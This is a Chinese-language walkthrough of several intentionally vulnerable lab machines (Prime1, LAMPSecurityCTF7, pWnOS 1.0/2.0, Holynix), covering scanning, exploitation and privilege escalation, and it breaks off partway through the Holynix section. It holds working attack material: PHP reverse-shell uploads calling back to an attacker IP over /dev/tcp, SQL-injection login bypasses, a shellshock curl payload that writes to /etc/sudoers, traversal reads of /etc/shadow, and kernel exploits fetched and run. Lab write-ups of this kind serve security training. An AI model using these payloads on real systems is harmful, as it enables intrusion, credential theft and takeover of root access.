根据内核版本信息，去查找是否有提权漏洞,于是找到第二个是提权漏洞。
searchsploit Linux ubuntu 4.10.0
```

![image-20250119210351547](靶场攻击1/image-20250119210351547.png)	

```
下载对应的c文件,然后查看这个c文件发现，只需gcc编译执行就能提权了。
searchsploit searchsploit Linux ubuntu 4.10.0 -m 45010
cat 45010.c
```

![image-20250119210534839](靶场攻击1/image-20250119210534839.png)	

```
那么kali先开启http服务器，让靶机能够下载这个c文件
python3 -m http.server 8088
```

![image-20250119210700368](靶场攻击1/image-20250119210700368.png)	

```
靶机下载这个漏洞提权文件，最好在tmp目录下下载，因为这个目录权限对普通用户友好。
```

![image-20250119210805092](靶场攻击1/image-20250119210805092.png)	

```
编译执行，此时提权成功.
gcc 45010.c -o 45010
./45010
```

![image-20250119210916190](靶场攻击1/image-20250119210916190.png)	

# Prime1的另一种提取思路

```
首先获取到该靶机的shell后，查看是否有可执行的sudo命令,发现会以root身份执行enc文件。
sudo -l
```

![image-20250121125809457](靶场攻击1/image-20250121125809457.png)	

```
由于enc文件与openssl的关联性比较大，可以首先尝试去执行enc文件，但是需要saket用户的密码，于是暂时无法执行。
由于是靶机，可能存在存储密码文件在靶机的情况，于是需要进行搜索，可以搜索backup关键字看是否能找到,自己过滤掉无用的backup相关的文件，于是找到两个怀疑对象。
find / -name *backup* 2>/dev/null|sort|less
```

![image-20250121131523567](靶场攻击1/image-20250121131523567.png)	

![image-20250121131634982](靶场攻击1/image-20250121131634982.png)	

```
分别查看这两个文件。其中/var/backups目录下的文件权限不足，无法查看，所以只能查看另一个目录。于是找到了执行enc文件的密码(backup_password)。
```

![image-20250121131832095](靶场攻击1/image-20250121131832095.png)	

```
使用该密码进行ssh登录无法成功，但是执行enc文件使用该密码则可以，于是得到两个文件分别是enc.txt和key.txt
sudo ./enc
```

![image-20250121132300721](靶场攻击1/image-20250121132300721.png)	

```
分析得知enc.txt肯定就是密文文件，key.txt就是密钥文件。其中查看key.txt提示使用ippsec转换成md5hash来作为密钥进行解密。
```

![image-20250121132355907](靶场攻击1/image-20250121132355907.png)	

```
于是获得ippsec的md5hash值。
-n表示输入字符串时不自带\n换行,awk是为了标准化输出，因为直接md5sum生成的hash后面带有一些无用字符，可以使用awk分割把hash和无效字符拆分出来，并使用print打印出来(366a74cb3c959de17d61db30591c39d1)。
echo -n 'ippsec'|md5sum|awk -F ' ' '{print $1}'
```

![image-20250121133210819](靶场攻击1/image-20250121133210819.png)	

```
首先根据查看enc.txt密文文件，可以发现这个加密的文件可能是经过base64编码的。
```

![image-20250121133736080](靶场攻击1/image-20250121133736080.png)	

```
由于openssl支持的加解密算法过多，但却不知道这个密文使用什么加密算法，于是只能把所有的加密算法都保存到一个文件，便于后续使用for循环依次进行尝试。可以通过openssl  --help依次把所有的加密类型保存起来。
```

![image-20250121135559160](靶场攻击1/image-20250121135559160.png)		

```
在将这些加密算法在指定保存文件中进行格式的修整
首先全局替换空格变成换行符，使用sort排序，把加密算法的相隔换行符去除，但是根据查看行数发现前面还是有过多的空格
awk '{gsub(/ /,"\n");print}' enc_type|sort|wc -l
去除前面多余空格，只保留一个空格,此时查看行数正常，说明没有多余空格了
awk '{gsub(/ /,"\n");print}' enc_type|sort|uniq|wc-l
将修整好的格式输出到指定文件即可。
awk '{gsub(/ /,"\n");print}' enc_type|sort |uniq >CipherType
```

```
查看输出的文件，此时加密算法类型都一行一行排整齐，便于后续进行for循环解密。
```

![image-20250121140327219](靶场攻击1/image-20250121140327219.png)	

```
通过查看openssl enc的文档，发现指定密钥使用-K，并且密钥要保证是十六进制格式，也就是说md5 hash还要转换成十六进制的格式。
man openssl enc
```

![image-20250121140507143](靶场攻击1/image-20250121140507143.png)	

```
对md5的hash进行十六进制转换。
echo -n 'ippsec'|md5sum|awk -F ' ' '{print $1}'|tr -d '\n'|od -A n -t x1|tr -d '\n'|tr -d ' '
其中td -d '\n'表示清除所有的换行符,od -A n表示不显示地址,-t x1指定输出格式为十六进制
```

![image-20250121140807594](靶场攻击1/image-20250121140807594.png)	

```
于是将enc.txt的密文内容复制出来，然后配合for循环所有的解密算法进行解密即可。于是解密出内容，还得知是使用aes-256-ecb解密出来的，得知了saket用户的密码是tribute_to_ippsec
open enc中的-d是指解密，-a是指解密时先进行base64解码,-$Cipher根据for循环依次使用不同的加密算法解密,-K指定十六进制的密钥。由于解密的过程中肯定会产生很多错误数据，于是需要把标准错误输出重定向到黑洞，以便过滤出有效信息，并输出对应的解密算法，可以知道是通过哪个解密算法解密出数据。
for Cipher in $(cat CipherType);do echo  'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4='|openssl enc -d -a -$Cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null;echo $Cipher;done
```

![image-20250121141942797](靶场攻击1/image-20250121141942797.png)	

```
于是使用ssh登录saket用户
ssh saket@192.168.15.60
```

```
接下来就是使用saket用户的提取环节，首先查看到以root用户执行某个文件。
```

![image-20250121142253594](靶场攻击1/image-20250121142253594.png)	

```
由于这个文件无法查看，于是尝试sudo执行这个脚本，结果发现提示challenge文件不存在。
sudo ./undefeated_victor
```

![image-20250121142739001](靶场攻击1/image-20250121142739001.png)	

```
在challenge文件试着写入shell命令，生成新的shell，如果以root执行成功，则提权成功。
echo '#!/bin/bash' > challenge
echo '/bin/bash' >> challenge
```

![image-20250121142925914](靶场攻击1/image-20250121142925914.png)	

```
于是重新执行提权成功。
sudo ./undefeated_victor
```

![image-20250121143130507](靶场攻击1/image-20250121143130507.png)	

# LAMPSecurityCTF7

```
注意该靶机启动必须点击移动虚拟机，点击复制虚拟机可能会出现nmap扫描不出的情况。
```

```
扫描C段确定靶机ip
nmap -sn 192.168.15.0/24
```

![image-20250121180205418](靶场攻击1/image-20250121180205418.png)	

```
扫描靶机的端口
nmap --min-rate 10000 -p- 192.168.15.61 
```

![image-20250121180352608](靶场攻击1/image-20250121180352608.png)	

```
扫描靶机的UDP端口,发现并无开放UDP端口。
nmap -sU -p- 192.168.15.61
```

![image-20250121181246556](靶场攻击1/image-20250121181246556.png)	

```
检测开放端口的服务版本号以及操作系统信息
nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.15.61
```

![image-20250121180940831](靶场攻击1/image-20250121180940831.png)	

```
根据开放的端口检测是否有可利用漏洞
nmap --script=vuln -p22,80,137,138,139,901,5900,8080,10000 192.168.15.61
```

![image-20250121181331321](靶场攻击1/image-20250121181331321.png)	

```
根据开放端口优先级，先对80端口进行渗透，但并没有发现什么漏洞利用的地方。
```

![image-20250121181552748](靶场攻击1/image-20250121181552748.png)	

```
那么只能对该站点进行目录扫描，于是扫描出很多的url路径。
dirb http://192.168.15.61/
```

![image-20250121182631330](靶场攻击1/image-20250121182631330.png)	

```
接下来在对8080端口进行渗透，根据登录界面进行万能密码尝试，看是否存在sql注入。于是发现使用万能密码登录成功。
admin' or 1=1#
```

![image-20250121182007464](靶场攻击1/image-20250121182007464.png)		

```
发现这个站点中点击add new可以进行文件上传，于是可以检测是否存在文件上传漏洞。
```

![image-20250121182200409](靶场攻击1/image-20250121182200409.png)	

```
将shell.php上传进去，内容如下。
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.15.128/1234 0>&1'");?>
```

![image-20250121182503421](靶场攻击1/image-20250121182503421.png)	

```
在目录扫描的过程中，游览很多url路径，并无什么有效信息，其中游览assets目录，里面存在shell.php，就是之前上传的php文件。
```

![image-20250121182754342](靶场攻击1/image-20250121182754342.png)	

```
那么kali此时建立监听
nc -lvnp 1234
```

![image-20250121183112063](靶场攻击1/image-20250121183112063.png)	

```
接下来进去就是提权环节，首先先提高bash的交互性
python -c "import pty;pty.spawn('/bin/sh')"
```

![image-20250121183217375](靶场攻击1/image-20250121183217375.png)	

```
然后查看可以执行的sudo命令,由于需要密码但是却不知道，所以暂时无法通过该方式进行提权。
sudo -l
```

![image-20250121183245425](靶场攻击1/image-20250121183245425.png)	

```
那么接下来就先查看一些敏感文件，比如说网站根目录，是否存在数据库配置文件。于是进行查看
car db.php
```

![image-20250121183354334](靶场攻击1/image-20250121183354334.png)	

```
于是发现mysql数据库竟然没有密码就可以登录。
```

![image-20250121183513528](靶场攻击1/image-20250121183513528.png)	

```
然后登录mysql,在查看里面数据库的users表的数据。
mysql -uroot
select username,password from users;
```

![image-20250121183620710](靶场攻击1/image-20250121183620710.png)	

```
将里面的用户名和密码复制到一个文件中，比如说这里存放到cred.lst文件中
提取其中的用户名信息，并放入到一个文件中。
cat cred.lst|awk -F ' ' '{print $2}'|awk -F '@' '{print $1}' > user.lst
```

![image-20250121184028793](靶场攻击1/image-20250121184028793.png)	

```
提取里面的密码hash到一个文件中
cat cred.lst|awk -F ' ' '{print $4}' >hash.lst
```

![image-20250121184251554](靶场攻击1/image-20250121184251554.png)	

```
紧接着需要判断这个hash是什么类型,根据检测说明大概率是MD5。
hash-identifier 'e22f07b17f98e0d9d364584ced0e3c18'
```

![image-20250121184348947](靶场攻击1/image-20250121184348947.png)	

```
接下来使用hashcat对md5的内容进行碰撞
-m 0指定md5破解,-a 0指定使用字典破解
hashcat -m 0 -a 0 hash.lst /usr/share/wordlists/rockyou.txt
```

![image-20250121184750725](靶场攻击1/image-20250121184750725.png)	

```
将密码复制下来，然后提取出明文密码。
cat passwordraw.lst|awk -F ':' '{print $2}' > pass.lst
```

![image-20250121185013820](靶场攻击1/image-20250121185013820.png)	

```
根据保存的用户名和密码可以进行密码喷射攻击，即将每个密码都用给各个用户进行登录。
crackmapexec ssh 192.168.15.61 -p pass.lst -u user.lst --continue-on-success
根据第一次回显的结果，根据喷射成功的结果进行过滤。
crackmapexec ssh 192.168.15.61 -p pass.lst -u user.lst --continue-on-success|grep +
```

![image-20250121185646646](靶场攻击1/image-20250121185646646.png)	

```
于是根据破解出来的账号和密码进行远程登录
由于第一次登录说缺少指定的主机密钥，于是使用-oHostKeyAlgorithms参数包含提示的密钥即可。
ssh brian@192.168.15.61 -oHostKeyAlgorithms=ssh-rsa,ssh-dss
```

![image-20250121185927620](靶场攻击1/image-20250121185927620.png)	

```
接下来就是提权环节，发现sudo命令可以任意执行，那么就随便提权了。
sudo -l
```

![image-20250121190034374](靶场攻击1/image-20250121190034374.png)	

```
于是提权成功
sudo /bin/bash
```

![image-20250121190128156](靶场攻击1/image-20250121190128156.png)	

# pWnOS2.0 

```
由于该靶机是固定的ip,ip是10.10.10.100,所以需要把nat模式下的网段进行修改，才能进行实验。
```

```
首先扫描c段，确定靶机的IP是10.10.10.100
nmap -sn 10.10.10.0/24
```

![image-20250121193040555](靶场攻击1/image-20250121193040555.png)	

```
对靶机的端口进行扫描，发现22和80端口开放
nmap --min-rate 10000 -p- 10.10.10.100
```

![image-20250122115826714](靶场攻击1/image-20250122115826714.png)	

```
检测开放端口的版本信息以及操作系统信息
nmap -sT -sV -O -p22,80 10.10.10.100
```

![image-20250122115923156](靶场攻击1/image-20250122115923156.png)	

```
扫描靶机是否有UDP端口。发现并无任何UDP端口开放
nmap -sU --min-rate 10000 -p- 10.10.10.100 
```

![image-20250122120253950](靶场攻击1/image-20250122120253950.png)	

```
扫描开放端口是否存在可利用漏洞
nmap --script=vuln -p22,80 10.10.10.100
```



```
由于80的优先级大于22，所以优先先对网页进行渗透测试，发现可以使用万能密码进行注入
```

![image-20250122120512746](靶场攻击1/image-20250122120512746.png)		

```
但是注入进去,确实能够登录，但是登录进去的页面明显无作用。
这里也可以采用sqlmap去获取数据库的数据，但是这里不用该方式，而进行另一个路线的走法。
-u指定url,--data指定两个post请求的参数,--dbs输出数据库信息,--dump导出数据库信息,--batch实现自动化，不用做出选择
sqlmap -u "http://10.10.10.100/login.php" --data="email=test@example.com&pass=1234" --dbs --dump --batch
```

![image-20250122120522574](靶场攻击1/image-20250122120522574.png)	

```
接下来对网站进行目录扫描
dirb http://10.10.10.100/
```

![image-20250122120725818](靶场攻击1/image-20250122120725818.png)	

```
根据dirb扫描出来的路径，访问/blog的路径，发现里面页面类似一个cms系统。
```

![image-20250122120844083](靶场攻击1/image-20250122120844083.png)	

```
查看源码搜寻cms名称的相关信息，配合大部分cms都会有的关键字powered,于是搜索到该cms的名称。
```

![image-20250122121841280](靶场攻击1/image-20250122121841280.png)	

```
查找该cms存在的漏洞，发现有两个漏洞，随便使用其中一个。
searchsploit Simple PHP Blog 0.4.0
```

![image-20250122122040448](靶场攻击1/image-20250122122040448.png)	

```
下载对应的漏洞脚本
searchsploit Simple PHP Blog 0.4.0 -m 1191
```

```
通过查看里面的脚本代码，里面具有使用说明
```

![image-20250122122333731](靶场攻击1/image-20250122122333731.png)	

```
由于直接执行脚本会报错，根据网页搜寻，需要安装这个库才行
sudo apt-get install libswitch-perl
于是执行脚本，能够运行完成，那么就成功的在该cms创建了用户名和密码。
perl 1191.pl -h http://10.10.10.100/blog/ -e 3 -U hsw -P 123456
```

![image-20250122123553905](靶场攻击1/image-20250122123553905.png)			

```
登录该cms系统
```

![image-20250122122832146](靶场攻击1/image-20250122122832146.png)	

```
游览这个cms系统，发现里面存在文件上传，于是上传一个shell.php木马。
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'");?>
```

![image-20250122123652275](靶场攻击1/image-20250122123652275.png)	

```
kali建立好监听
nc -lvnp 1234
根据之前的dirb扫描，能够确认shell.php位置，于是进行访问
```

![image-20250122123958430](靶场攻击1/image-20250122123958430.png)	

```
接下来就是提权环节，但是由于不知道该用户的密码，所以无法查看对应的sudo命令。而且查询定时计划任务，也无发现能够提权的操作。
但是由于cms一般都会有数据库信息，所以去网站根目录寻找数据库的配置信息，发现了其中里面的数据库管理员的密码
cat mysqli_connect.php
```

![image-20250122124435313](靶场攻击1/image-20250122124435313.png)	

```
由于根据这个密码无法登录mysql,说明很有可能还有这个配置文件，只是说该配置文件没有被使用而已,于是经过查找确实是有两个数据库配置文件。
find / -name mysqli_connect.php 2>/dev/null
```

![image-20250122124600162](靶场攻击1/image-20250122124600162.png)	

```
查看另一个数据库配置文件，得到数据库密码(root@ISIntS)
```

![image-20250122124640502](靶场攻击1/image-20250122124640502.png)	

```
登录mysql,并查看对应的用户表信息，发现里面有一串密码hash(c2c4b4e51d9e23c02c15702c136c3e950ba9a4af)
```

![image-20250122125301492](靶场攻击1/image-20250122125301492.png)	

```
检测这一段密码hash是属于什么类型的,于是检测是SHA-1
hash-identifier 'c2c4b4e51d9e23c02c15702c136c3e950ba9a4af'
```

![image-20250122125416323](靶场攻击1/image-20250122125416323.png)	

```
通过web搜寻SHA-1 Cracker进行暴力破解，得到明文密码(killerbeesareflying)
```

![image-20250122125536415](靶场攻击1/image-20250122125536415.png)	

```
但是根据这个密码进行尝试ssh登录都失败了，于是根据对运维人员的经验，他们可能会把数据库的密码作为自己的root密码那么只能这么进行尝试。于是使用密码(root@ISIntS)登录上去，顺利获得root权限。 
ssh root@10.10.10.100
```

![image-20250122125937661](靶场攻击1/image-20250122125937661.png)	

# pWnOS1.0

```
探测C段主机，确定靶机ip.
nmap -sn 10.10.10.0/24
```

![image-20250122235035172](靶场攻击1/image-20250122235035172.png)	

```
对靶机进行端口扫描
nmap --min-rate 10000 -p- 10.10.10.129
```

![image-20250122235241405](靶场攻击1/image-20250122235241405.png)	

```
对开放端口检测服务版本和操作系统
nmap -sT -sV -O -p22,80,139,445,10000 10.10.10.129
```

![image-20250122235533221](靶场攻击1/image-20250122235533221.png)	

```
对靶机的UDP端口进行探测
nmap -sU --min-rate 10000 -p- 10.10.10.129
```

![image-20250122235759784](靶场攻击1/image-20250122235759784.png)	

```
对开放端口进行可利用漏洞的检测
nmap --script=vuln -p22,80,139,445,10000 10.10.10.129
```



```
首先先对80端口的网页进行渗透测试，初步看感觉网页上并无任何有效信息，但对参数的内容进行sql注入操作，发现会报错，并且提示文件包含等关键字，于是猜测具有文件包含漏洞。
```

![image-20250123000349880](靶场攻击1/image-20250123000349880.png)	

```
根据以下payload，来包含文件，发现能够查看到passwd用户信息的敏感文件。但是shadow文件却无法查看，说明是网站用户的权限比较低，所以无法直接查看。
http://10.10.10.129/index1.php?help=&connect=/etc/passwd
```

![image-20250123000439963](靶场攻击1/image-20250123000439963.png)	

```
根据nmap的扫描结果得知，80端口下有一个/php路径，并且10000端口存在webmin文件泄露的情况。
```

![image-20250123000944033](靶场攻击1/image-20250123000944033.png)	

```
首先查看/php路径，里面只是一个phpmyadmin文件，点击进去就是一个登录框，但由于并不知道账号密码且无sql注入漏洞，暂时无从下手。
```

![image-20250123001104607](靶场攻击1/image-20250123001104607.png)	

```
于是对10000端口的网站进行查看，经测试也无sql注入漏洞，但这明显是一个cms，于是查看该cms是否有可利用漏洞
```

![image-20250123001445493](靶场攻击1/image-20250123001445493.png)	

```
查看是否存在可利用的漏洞，由于可利用很多，而且使用msf的漏洞过于无脑，为了学习所以采用pl脚本的漏洞，该漏洞可以查看任意文件。
searchsploit webmin
```

![image-20250123001652999](靶场攻击1/image-20250123001652999.png)	

```
首先下载该漏洞脚本
searchsploit webmin -m 2017.pl
```

![image-20250123001909938](靶场攻击1/image-20250123001909938.png)	

```
查看该脚本的使用说明
perl 2017.pl --help
```

![image-20250123002107909](靶场攻击1/image-20250123002107909.png)		

```
于是根据该脚本的说明进行任意文件查询,基于这个webmin的url路径来任意查看shadow敏感文件。
perl 2017.pl 10.10.10.129 10000 /etc/shadow 0
```

![image-20250123002210886](靶场攻击1/image-20250123002210886.png)	

```
将有密码的内容复制到一个文件中，即以下内容复制到一个文件中。
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
```

```
使用john碰撞出hash值的密码,其中userhash是保存以上内容的文件。于是碰撞出vmware用户的密码是h4ckm3
john userhash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20250123003043028](靶场攻击1/image-20250123003043028.png)	

```
于是使用远程登陆该用户，由于ssh版本服务不对应，需要使用-oHostKeyAlgorithms设置主机密钥。
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@10.10.10.129
```

![image-20250123003206984](靶场攻击1/image-20250123003206984.png)	

```
接下来就是提权环节，查看sudo，发现该用户无任何可执行的sudo命令，并且计划任务也没有可以提权的。
```

![image-20250123003554191](靶场攻击1/image-20250123003554191.png)	

```
于是可以尝试一种思路，先弄一个cgi后缀的可执行文件脚本，语言是pl的，然后使用2017.pl漏洞文件尝试去访问触发反弹shell的执行，从而获得root权限，因为这个漏洞文件能够访问shadow，那么大概率就是root了。
于是复制一份pl脚本的反弹shell.
```

![image-20250123005054026](靶场攻击1/image-20250123005054026.png)	

```
修改脚本的监听ip，设置为当前kali的机器
```

![image-20250123005238065](靶场攻击1/image-20250123005238065.png)	

```
kali建立http服务器，让靶机下载这个反弹shell文件。
python -m http.server 8085
靶机下载该文件,并设置文件的具备可执行权限。
wget http://10.10.10.128:8085/shell.cgi
chmod +x shell.cgi
```

![image-20250123010432427](靶场攻击1/image-20250123010432427.png)		

```
kali开始监听,等待漏洞文件执行后，即可得到root
nc -lvnp 1234
然后再使用漏洞文件，去访问这个cgi文件触发执行。
perl 2017.pl 10.10.10.129 10000 /home/vmware/shell.cgi 0
```

![image-20250123011647782](靶场攻击1/image-20250123011647782.png)	

# pwnOS1.0另一种解法和提权思路

```
根据perl漏洞文件获取所有用户的信息
perl 2017.pl 10.10.10.129 10000 /etc/shadow 0 
```

![image-20250124140120182](靶场攻击1/image-20250124140120182.png)	

```
于是根据以上用户，先获取其中一个用户vmware的ssh公钥文件。
perl 2017.pl 10.10.10.129 10000 /home/vmware/.ssh/authorized_keys 0
```

![image-20250124140229832](靶场攻击1/image-20250124140229832.png)	

```
当不知道一个靶机具有什么敏感文件信息，可以在github搜索Auto_Wordlists,里面具有linux和windows相关敏感文件的目录信息，当有文件包含漏洞时可以查看这个字典。
```

![image-20250124140442241](靶场攻击1/image-20250124140442241.png)	

```
这里需要补充一个知识，服务器端存放的是公钥，而客户端存放私钥，只有通过对应的私钥进行登录才能实现免密登录，但是这里有个问题，没有私钥，我们只有该靶机对应的用户公钥文件，但是ssh公钥私钥文件皆是由openssl生成的，于是可以查看openssl相关的漏洞,找到了有关ssh暴力破解的漏洞文件。
解释一下这个ssh暴力破解，本质上就是在指定openssl版本生成的ssh的rsa证书的随机种子过小，只有65536的大小，所以该漏洞存放了所有不同随机种子生成的rsa证书，那么只要依次碰撞里面公钥，总能找到对应的私钥，那么有了私钥就可以实现ssh免密登录。
searchsploit openssl
```

![image-20250124140833400](靶场攻击1/image-20250124140833400.png)	

```
下载这个漏洞脚本文件
searchsploit openssl -m 5622.txt
```

![image-20250124140942437](靶场攻击1/image-20250124140942437.png)	

```
查看这个txt文件，找到里面压缩包的地址并下载这个压缩包
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
```

![image-20250124141018936](靶场攻击1/image-20250124141018936.png)	

![image-20250124141110425](靶场攻击1/image-20250124141110425.png)	

```
解压这个文件。
tar -vjxf 5622.tar.bz2
然后复制vmware用户下公钥的前三四十个字符去搜索，看能否碰撞出公钥,结果确实碰撞出对应的公钥了。
-l找到文件内容中的对应字符，那么则列出这个文件名，-r是递归，即从指定目录下，把当前目录的所有文件都进行搜寻。
grep -lr "AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM"
```

![image-20250124141816413](靶场攻击1/image-20250124141816413.png)	

```
根据对应的公钥，获取对应的私钥，并将对应的私钥复制出来。
ls d8629ce6dc8f2492e1454c13f46adb26-4566*  
```

![image-20250124142105350](靶场攻击1/image-20250124142105350.png)	

![image-20250124142159188](靶场攻击1/image-20250124142159188.png)	

```
于是携带私钥来实现免密登录，但是还是需要密码，提示没有共同的签名支持。
-i指定私钥文件
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -i d8629ce6dc8f2492e1454c13f46adb26-4566 vmware@10.10.10.129
```

![image-20250124142414241](靶场攻击1/image-20250124142414241.png)	

```
在ssh登录免密登录时进行debug调试，发现确实提示没有共同的签名支持
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -i d8629ce6dc8f2492e1454c13f46adb26-4566 -vv  vmware@10.10.10.129
```

![image-20250124142501174](靶场攻击1/image-20250124142501174.png)	

```
于是携带新的参数即可使得有共同的签名支持，那么就能实现免密登录了。
-oPubkeyAcceptedKeyTypes用于携带共同签名支持
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -i d8629ce6dc8f2492e1454c13f46adb26-4566 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss vmware@10.10.10.129
```

![image-20250124142639117](靶场攻击1/image-20250124142639117.png)	

## 提权思路1

```
查看bash的版本，发现bash版本过低，只要bash版本在4.3及以下即可利用shellshock漏洞
bash -version
```

![image-20250124143345924](靶场攻击1/image-20250124143345924.png)	

```
用该命令，可以验证发现存在shellshock漏洞，因为环境仅仅知识设置环境变量，但是后面携带的bash语句也都执行了
env x='() { :; }; echo "it is vulnerable";' bash -c date;
```

![image-20250124144157039](靶场攻击1/image-20250124144157039.png)	

```
将bash环境传入到test.cgi文件中，并设置可执行权限
echo '#!/bin/bash' >> test.cgi  
chmod +x test.cgi
```

```
由于Webmin是一个基于 Web 的系统管理工具,使用了大量的 CGI 脚本来处理用户的请求和执行管理任务,如果从web请求中设置请求头中的内容，在里面携带一些恶意bash命令，如果能查看shadow文件，那大概率就是root用户，那么就有可能提权成功。
首先查看2017.pl漏洞脚本文件,发现本质上就是拼接特定字符串，就可以任意文件查看。
```

![image-20250124145422282](靶场攻击1/image-20250124145422282.png)		

```
比如说这么访问，就可以获得shadow敏感文件的内容，那么大概率是以root身份才能这么获取敏感文件。
http://10.10.10.129:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
```

![image-20250124145511718](靶场攻击1/image-20250124145511718.png)	

```
利用shellshock给vmware用户添加所有的sudo命令可执行，并且不需要输入任何密码。
curl http://10.10.10.129:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/test.cgi -A '() { :; }; /bin/echo "vmware ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
```

![image-20250124150125932](靶场攻击1/image-20250124150125932.png)	

```
可以查看/etc/sudoers文件的内容，发现确实是添加进去了
```

![image-20250124150141396](靶场攻击1/image-20250124150141396.png)	

```
而一开始使用vmware用户是需要密码的，但是现在查看sudo命令，不仅不需要密码，而且可以任意命令sudo执行。
```

![image-20250124150302797](靶场攻击1/image-20250124150302797.png)	

```
于是提权成功。
sudo /bin/bash
```

![image-20250124150339173](靶场攻击1/image-20250124150339173.png)	

## 提权思路2

```
第二种思路可以采用内核提权的方法进行。
首先查看内核版本，发现操作系统内核版本过低，可以尝试内核提权
uname -a
```

![image-20250124150531153](靶场攻击1/image-20250124150531153.png)	

```
查看操作系统内核是否存在可利用漏洞
searchsploit 2.6.2
根据回显结果，过滤出提权漏洞，经过查看发现5092.c文件，是符合2.6.22版本的提权漏洞
searchsploit 2.6.2|grep 'Privilege Escalation'
```

![image-20250124150902575](靶场攻击1/image-20250124150902575.png)	

```
将漏洞脚本下载下来。
searchsploit 2.6.2 -m 5092.c
```

![image-20250124151044620](靶场攻击1/image-20250124151044620.png)	

```
部署http服务以便靶机获取这个漏洞脚本提权文件
python -m http.server 8089
靶机获取这个漏洞文件
wget http://10.10.10.128:8089/5092.c
靶机对该漏洞文件进行编译
gcc 5092.c -o 5092
执行这个内核提权漏洞。
./5092
```

![image-20250124151347497](靶场攻击1/image-20250124151347497.png)	

# Holynix

```
扫描c段，确定靶机的ip地址
nmap -sn 10.10.10.0/24
```

![image-20250124220911791](靶场攻击1/image-20250124220911791.png)	

```
根据靶机的ip进行端口扫描
nmap --min-rate 10000 -p- 10.10.10.130 
```

![image-20250124221039321](靶场攻击1/image-20250124221039321.png)	

```
扫描靶机的UDP端口
nmap --min-rate 10000 -sU -p- 10.10.10.130
```

![image-20250124221310588](靶场攻击1/image-20250124221310588.png)	

```
检测开放端口的服务版本信息和操作系统信息
nmap -sT -sV -O -p80 10.10.10.130   
```

![image-20250124221302423](靶场攻击1/image-20250124221302423.png)	

```
根据开放的端口进行nmap漏洞脚本扫描,发现枚举出很多的目录。
nmap --script=vuln -p80 10.10.10.130
```

![image-20250124222854789](靶场攻击1/image-20250124222854789.png)	

```
访问web界面，里面有个登录框，尝试进行万能密码注入，发现存在sql注入漏洞，能够登录成功。
hsw' or 1=1#
```

![image-20250124221515122](靶场攻击1/image-20250124221515122.png)	

```
进入后发现可疑的page参数，进行文件包含漏洞尝试，但是失败了
```

![image-20250124221610688](靶场攻击1/image-20250124221610688.png)	

```
由于网页存在上传点，于是复制一份php反弹shell模板。
cp /usr/share/webshells/php/php-reverse-shell.php /root/vulnhub/php-reverse-shell.php
```

![image-20250124222146410](靶场攻击1/image-20250124222146410.png)	

```
修改木马文件的监听ip为kali机器,由于上传文件要求是gzip格式，并对其进行gzip压缩
gzip php-reverse-shell.php
```

![image-20250124222323589](靶场攻击1/image-20250124222323589.png)	

```
但是发现这个用户权限很低无法进行文件上传操作，于是只能继续游览网页寻找其他漏洞，发现security部分中的网页存在一个下拉框，里面可以点击展示文件，于是能展示出信息，但是从url角度无法看到传参，于是怀疑这也可能具有文件包含的漏洞。
```

![image-20250124223155445](靶场攻击1/image-20250124223155445.png)	

```
查看源码，发现本质上就是存在一个参数text_file_name，当选择了email，就会包含ssp/email.txt文件的内容。 
```

![image-20250124223346660](靶场攻击1/image-20250124223346660.png)	

```
于是利用文件包含漏洞查看到passwd文件的内容,但是由于权限过低，想要查看shadow文件失败了
```

![image-20250124223500770](靶场攻击1/image-20250124223500770.png)	

```
于是新的想法产生了，由于当前用户权限较低，导致无法上传文件，那随便用里面的一个用户构造万能密码即可。比如说使用里面的用户etenenbaum，根据sql注入发现username字段并不存在sql注入，只有密码存在，所以密码实际上可以随便输入，然后配合or让username等于一个存在的用户，那必然为真，自然可以跳过登录验证，具体payload如下。
1' or username='etenenbaum'#
```

![image-20250125012813678](靶场攻击1/image-20250125012813678.png)	

```
由于登录新用户，于是可以点击upload尝试上传木马文件。
```

![image-20250125012832960](靶场攻击1/image-20250125012832960.png)	

```
直接上传shell.php即可，shell脚本内容如下
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'");?>
但是奇怪的是kali监听，然后点击这个上传的文件会说权限不够。于是只能尝试上传压缩包解压自提取的路线
```

![image-20250125014803968](靶场攻击1/image-20250125014803968.png)		

```
发现上传成功,传入了参数中有transfer.php，于是查看这个transfer.php的源码，得知如果勾选自动提取gzip，会采用tar xzf进行解包和解压缩。而且从源码中看出上传的文件是移动到/home/指定用户名/上传文件名，所以寻找上传的文件可以进行这么访问http://10.10.10.130/~etenenbaum
```

![image-20250125015745864](靶场攻击1/image-20250125015745864.png)		

```
